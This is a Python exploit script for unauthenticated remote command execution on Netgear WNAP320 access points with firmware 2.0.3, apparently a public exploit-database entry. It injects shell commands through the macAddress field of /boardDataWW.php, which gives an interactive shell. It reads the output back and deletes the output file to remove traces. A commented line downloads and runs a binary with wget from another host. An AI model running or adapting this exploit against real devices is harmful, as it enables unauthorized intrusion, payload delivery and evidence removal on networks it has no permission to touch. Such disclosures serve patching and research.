# Exploit Title: Netgear WNAP320 2.0.3 - 'macAddress' Remote Code Execution (RCE) (Unauthenticated)
# Vulnerability: Remote Command Execution on /boardDataWW.php macAddress parameter
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# IoT Device: Netgear WNAP320 Access Point
# Version: WNAP320 Access Point Firmware v2.0.3

import requests
import sys

if(len(sys.argv) != 2):
	print('Must specify the IP parameter')
	print("eg: python3 wnap320_v2_0_3.py <IP>")
	sys.exit(0)

host = sys.argv[1]
port = 80

#cmd = 'wget http://192.168.0.99:8080/mips; chmod +x mips; ./mips; rm -rf mips;'
cmd = "touch /home/cli/menu/itworks.txt"

while(True):
	cmd = input('Shell_CMD$ ')
	#injecting system command part writing the command output to a output file
	data = {
		'macAddress' : '112233445566;' + cmd + ' > ./output #',
		'reginfo' : '0',
		'writeData' : 'Submit'
	} 

	url = 'http://' + host + '/boardDataWW.php'
	response = requests.post(url, data=data)

	if(response.ok):
		#read the command output result
		url = 'http://' + host + '/output'
		cmdOutput = requests.get(url)
		print(cmdOutput.text)

		#remove trace
		cmd = 'rm ./output'
		data = {
			'macAddress' : '112233445566;' + cmd + ' #',
			'reginfo' : '0',
			'writeData' : 'Submit'
		}
		url = 'http://' + host + '/boardDataWW.php'
		response = requests.post(url, data=data)
	else:
		print('[!] No response from the server.')
            
